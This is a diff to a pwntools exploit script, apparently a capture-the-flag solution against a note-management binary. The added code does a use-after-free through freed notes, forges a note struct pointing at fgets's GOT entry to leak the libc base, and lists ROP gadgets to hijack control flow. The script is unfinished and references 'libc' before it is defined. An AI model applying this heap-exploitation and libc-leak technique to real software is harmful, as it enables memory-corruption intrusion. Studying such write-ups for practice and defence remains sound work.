@@ -28,11 +28,41 @@ def print_note(idx):
 size = 0xa0
 content = 'faceb00c'
 magic = 0x400c23
+print_note_cotent_addr = 0x400886
+fgets_got = 0x602050
+fgets_off = 0x6dad0
+
+#
+'''
+0x000000000012de04 : mov rdi, rbp ; call rdx
+0x000000000013a940 : mov rdi, rsp ; call rdx
+'''
+#this make the gets to overflow stack
+mov_rdi_rsp_call_rdx = libc + 0x13a940 
 
 #first two
-add_note(size,content)
-add_note(size,content)
-#
+add_note(0xb0,'a'*16)#0
+add_note(0xb0,'b'*16)#1
+del_note(0)
+del_note(1)
+add_note(0x10,flat([print_note_cotent_addr,fgets_got]))#3
+print_note(0)
+
+#get libc
+libc = u64( r.recvline().strip().ljust(8,'\0') ) - fgets_off
+print 'glibc : ' , hex(libc)
+
+#now, start to hijack control flow
+'''
+0x000000000012de04 : mov rdi, rbp ; call rdx
+0x000000000013a940 : mov rdi, rsp ; call rdx
+'''
+#make a new chunk with replace print_note_content -> gets
+#this make the gets to overflow stack
+mov_rdi_rsp_call_rdx = libc + 0x13a940 
+#start to prepare rop chain
+
+r.interactive()
 #free
 '''
 del_note(0)
